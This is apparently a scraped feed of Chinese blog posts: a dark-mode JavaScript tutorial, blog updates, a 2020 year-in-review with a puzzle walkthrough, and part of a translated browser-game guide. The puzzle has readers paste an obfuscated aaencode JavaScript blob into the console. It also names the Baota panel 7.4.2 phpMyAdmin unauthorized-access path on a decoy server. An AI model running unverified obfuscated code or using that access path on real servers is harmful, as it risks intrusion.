class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 